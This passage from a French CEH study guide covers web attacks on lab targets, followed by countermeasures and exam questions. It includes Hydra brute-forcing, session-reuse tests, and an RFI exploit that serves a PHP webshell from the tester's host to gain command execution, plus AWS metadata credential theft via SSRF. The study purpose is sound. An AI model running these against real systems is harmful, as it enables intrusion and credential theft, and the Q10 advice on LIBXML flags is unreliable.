 LOGJAM (CVE-2015-4000)             not vulnerable (OK)
 BEAST (CVE-2011-3389)              TLS1: VULNERABLE! ← CRITIQUE
 LUCKY13 (CVE-2013-0169)            potentially VULNERABLE
```

---

## 📌 PARTIE 7 : OWASP A07 — BROKEN AUTHENTICATION

### 🛠️ Attaques sur l'authentification

```bash
# 1. Test de credentials par défaut
hydra -L /usr/share/wordlists/metasploit/default_usernames.txt \
      -P /usr/share/wordlists/metasploit/default_passwords.txt \
      192.168.1.10 \
      http-post-form "/login:username=^USER^&password=^PASS^:Login failed" \
      -t 20 \
      -o hydra_results.txt
```

**Sortie :**
```
[80][http-post-form] host: 192.168.1.10
    login: admin     password: admin
[80][http-post-form] host: 192.168.1.10
    login: admin     password: password
[80][http-post-form] host: 192.168.1.10
    login: root      password: toor

→ 3 credentials par défaut trouvés !
```

```bash
# 2. Vérifier la politique de verrouillage de compte
# (si pas de lockout → bruteforce illimité)
for i in {1..20}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "http://192.168.1.10/login" \
        -d "username=admin&password=wrong_pass_$i")
    echo "Tentative $i : HTTP $STATUS"
done
```

**Sortie :**
```
Tentative 1 : HTTP 401
Tentative 2 : HTTP 401
Tentative 5 : HTTP 401
Tentative 10 : HTTP 401
Tentative 15 : HTTP 401
Tentative 20 : HTTP 401

→ PAS DE VERROUILLAGE ! Bruteforce illimité possible !
```

```bash
# 3. Test de réutilisation de SESSION après déconnexion
# Obtenir une session
SESSION=$(curl -s -c - -X POST "http://192.168.1.10/login" \
    -d "username=admin&password=password" | grep PHPSESSID | awk '{print $7}')

echo "Session : $SESSION"

# Utiliser la session
curl -b "PHPSESSID=$SESSION" "http://192.168.1.10/profile"
# → Accès normal

# Se déconnecter
curl -b "PHPSESSID=$SESSION" "http://192.168.1.10/logout"

# Réutiliser la session après déconnexion
curl -b "PHPSESSID=$SESSION" "http://192.168.1.10/profile"
```

**Sortie si vulnérable :**
```
[Page de profil affichée après déconnexion !]
→ Session non invalidée côté serveur après logout !
→ Voler une session = accès permanent même après déconnexion
```

---

## 📌 PARTIE 8 : OWASP A05 — SECURITY MISCONFIGURATION

### 🛠️ phpinfo() exposé — Mine d'informations

```bash
curl http://192.168.1.10/phpinfo.php
```

**Informations critiques dans phpinfo() :**
```
PHP Version 5.2.4-2ubuntu5.10

System : Linux metasploitable 2.6.24-16-server
         #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

Configuration File : /etc/php5/apache2/php.ini
Loaded Configuration File : /etc/php5/apache2/php.ini

allow_url_fopen : On        ← RFI possible !
allow_url_include : On      ← RFI critique possible !
display_errors : On         ← Info leak via erreurs
expose_php : On             ← Version exposée
magic_quotes_gpc : Off
register_globals : On       ← CRITIQUE ! Injection variable
safe_mode : Off

MySQL:
Client API version : 5.0.51a

$_SERVER['DOCUMENT_ROOT'] : /var/www/html   ← Path serveur !
$_SERVER['SERVER_ADDR']   : 192.168.1.10
$_SERVER['SERVER_NAME']   : metasploitable
```

---

### 🛠️ RFI — Remote File Inclusion

```
PRÉREQUIS : allow_url_include = On (visible dans phpinfo)

PRINCIPE :
Si allow_url_include est activé, la vulnérabilité
Path Traversal peut inclure des fichiers DISTANTS !
→ On peut inclure un webshell hébergé sur notre serveur
```

```bash
# Héberger un webshell PHP sur notre machine
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 8080 &

# Exploiter via RFI
curl "http://192.168.1.10/dvwa/vulnerabilities/fi/
      ?page=http://192.168.1.5:8080/shell.php&cmd=id" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

→ RCE via Remote File Inclusion !
```

---

## 📌 PARTIE 9 : WORKFLOW COMPLET D'AUDIT WEB — BURP SUITE

### 🛠️ Méthodologie professionnelle avec Burp Suite

```
PHASE 1 : DÉCOUVERTE ET CARTOGRAPHIE
═══════════════════════════════════════════════════════════════

1. Configurer Burp Proxy (127.0.0.1:8080)
2. Naviguer sur toute l'application (spider manuel)
3. Target → Site Map → Observer la structure
4. Identifier :
   - Tous les paramètres GET/POST
   - Les endpoints API
   - Les cookies et headers
   - Les formulaires et leurs actions

PHASE 2 : IDENTIFICATION DES POINTS D'INJECTION
═══════════════════════════════════════════════════════════════

Pour chaque paramètre :
1. Envoyer au Repeater
2. Tester avec :
   '     → SQLi
   "     → SQLi
   <     → XSS
   {{7*7}} → SSTI
   ../   → Path Traversal
   ;id   → Command Injection
   ${7*7} → SSTI Spring
   
3. Observer les réponses :
   - Erreurs SQL → SQLi confirmé
   - Expressions évaluées → SSTI/IDOR
   - Données système → Path Traversal

PHASE 3 : EXPLOITATION
═══════════════════════════════════════════════════════════════

SQLi trouvé :
→ SQLMap pour automatisation complète
→ Extraction données, OS shell

XSS trouvé :
→ BeEF pour exploitation avancée
→ Keylogger, phishing, session stealing

SSRF trouvé :
→ Tester metadata cloud (AWS/Azure/GCP)
→ Scanner réseau interne
→ Accéder aux services locaux

XXE trouvé :
→ Lecture fichiers locaux
→ SSRF via XXE
→ Exfiltration out-of-band

IDOR trouvé :
→ Script Python pour extraction massive
→ Escalade de privilèges via paramètres
```

---

## 📌 PARTIE 10 : CONTRE-MESURES COMPLÈTES

```
OWASP A03 - INJECTION SQL :
════════════════════════════════════════════════════════════════

✅ Prepared statements / Parameterized queries
<?php
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$id]);
?>

✅ Stored procedures
✅ Input validation (whitelist)
✅ Least privilege DB (pas de DROP/CREATE pour l'app)
✅ WAF (ModSecurity règle SQLi)
✅ Error handling (pas d'erreurs SQL en production)

════════════════════════════════════════════════════════════════

OWASP A03 - XSS :
════════════════════════════════════════════════════════════════

✅ Output encoding (htmlspecialchars en PHP)
<?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?>

✅ Content Security Policy (CSP)
Header: Content-Security-Policy: default-src 'self'

✅ HttpOnly + Secure + SameSite sur cookies
✅ Input validation
✅ DOMPurify pour le DOM-based XSS

════════════════════════════════════════════════════════════════

OWASP A01 - BROKEN ACCESS CONTROL :
════════════════════════════════════════════════════════════════

✅ Validation côté serveur à chaque requête
✅ GUID non prédictibles plutôt que IDs séquentiels
✅ Principe du moindre privilège
✅ Tests automatisés des contrôles d'accès
✅ Deny by default

════════════════════════════════════════════════════════════════

OWASP A10 - SSRF :
════════════════════════════════════════════════════════════════

✅ Whitelist des URLs autorisées
✅ Blocage des IPs privées et de loopback
✅ Désactiver les redirections HTTP
✅ IMDSv2 obligatoire sur AWS (tokens de session)
✅ Network segmentation

════════════════════════════════════════════════════════════════

OWASP A04 - XXE :
════════════════════════════════════════════════════════════════

✅ Désactiver les entités externes dans le parser XML
// Java
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
// PHP
libxml_disable_entity_loader(true);

✅ Utiliser JSON plutôt que XML si possible
✅ Valider et filtrer le XML en entrée
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ OWASP Top 10 2021 — ordre et catégories
✅ SQLi types — in-band, blind, out-of-band, second-order
✅ SQLi Union-Based — trouver colonnes, extraire données
✅ SQLi Boolean-Based Blind — déduction vrai/faux
✅ SQLi Time-Based — SLEEP() pour déduire
✅ SQLMap — --dbs, --tables, --dump, --os-shell
✅ XSS Reflected vs Stored vs DOM — différences
✅ Payloads XSS — contournement de filtres
✅ IDOR — accès non autorisé via ID prévisible
✅ Mass Assignment — injection de paramètres cachés
✅ SSRF — accès métadata AWS/Azure/GCP
✅ SSRF Bypass — encodage IP décimal/hexadécimal
✅ XXE — lecture fichiers + SSRF via XML
✅ XXE Out-of-Band — exfiltration DNS/HTTP
✅ Broken Auth — lockout, session non invalidée
✅ Security Misconfiguration — phpinfo, RFI
✅ allow_url_include — RFI possible
✅ Prepared statements — contre SQLi
✅ CSP — contre XSS
✅ IMDSv2 — contre SSRF sur AWS
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 14

**Q1 :** Quelle différence entre SQLi Union-Based et Time-Based ?
> **Réponse : Union-Based = les données sont directement visibles dans la réponse via UNION SELECT. Time-Based = aucune donnée visible, on utilise SLEEP() pour déduire vrai/faux selon le délai de réponse. Time-based est utilisé quand il n'y a aucun retour visible.**

**Q2 :** Comment détecter le nombre de colonnes d'une requête SQL vulnérable ?
> **Réponse : Via ORDER BY incrémental — `ORDER BY 1`, `ORDER BY 2`... jusqu'à obtenir une erreur "Unknown column". Le nombre juste avant l'erreur = nombre de colonnes. Puis confirmer avec `UNION SELECT NULL,NULL,...`**

**Q3 :** Quelle différence entre XSS Reflected et XSS Stored ?
> **Réponse : Reflected = payload dans la requête, rebondit dans la réponse immédiate, non persistant, nécessite que la victime clique sur un lien. Stored = payload stocké en base de données, s'exécute pour tous les visiteurs, persistant et plus dangereux.**

**Q4 :** Qu'est-ce qu'une attaque IDOR et comment l'exploiter massivement ?
> **Réponse : IDOR (Insecure Direct Object Reference) = accès non autorisé à des ressources via identifiants prévisibles. Exploitation : script qui itère sur tous les IDs (1000, 1001, 1002...) et télécharge les ressources sans vérification d'autorisation côté serveur.**

**Q5 :** Comment SSRF permet-il de voler des credentials AWS ?
> **Réponse : Le serveur vulnérable est forcé à requêter `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`. Ce service cloud interne (inaccessible depuis internet) retourne les credentials IAM temporaires (AccessKeyId, SecretAccessKey, Token) utilisables pour accéder à l'API AWS.**

**Q6 :** Pourquoi `allow_url_include=On` dans PHP est-il critique ?
> **Réponse : Il permet l'inclusion de fichiers PHP distants via RFI (Remote File Inclusion). Un attaquant héberge un webshell PHP sur son serveur et force l'application à l'inclure via un paramètre vulnérable → RCE immédiat.**

**Q7 :** Quel paramètre SQLMap permet d'obtenir un shell OS ?
> **Réponse : `--os-shell` — SQLMap tente d'uploader un agent et d'établir un shell interactif. Il utilise les techniques comme INTO OUTFILE (MySQL) ou xp_cmdshell (MSSQL) selon le SGBD.**

**Q8 :** Comment les Prepared Statements protègent-ils contre SQLi ?
> **Réponse : Les prepared statements séparent le code SQL des données. La requête est compilée d'abord (`$pdo->prepare('SELECT * FROM users WHERE id = ?')`), puis les données sont passées séparément. Le moteur SQL ne peut plus confondre données et commandes — même `1' OR 1=1--` est traité comme une valeur littérale.**

**Q9 :** Qu'est-ce que le Mass Assignment et comment l'exploiter ?
> **Réponse : Vulnérabilité où un framework assigne automatiquement les paramètres HTTP aux propriétés d'un objet. En ajoutant un paramètre non prévu (ex: `role=admin`) dans une requête, si le serveur ne filtre pas les champs autorisés, il met à jour le rôle de l'utilisateur.**

**Q10 :** Comment désactiver les entités externes XXE en PHP ?
> **Réponse : `libxml_disable_entity_loader(true)` avant tout parsing XML. En PHP 8.0+, le chargement des entités externes est désactivé par défaut. Alternativement, utiliser `LIBXML_NOENT` et `LIBXML_DTDLOAD` à false dans `simplexml_load_string()`.**

---

> **Module 14 terminé. **
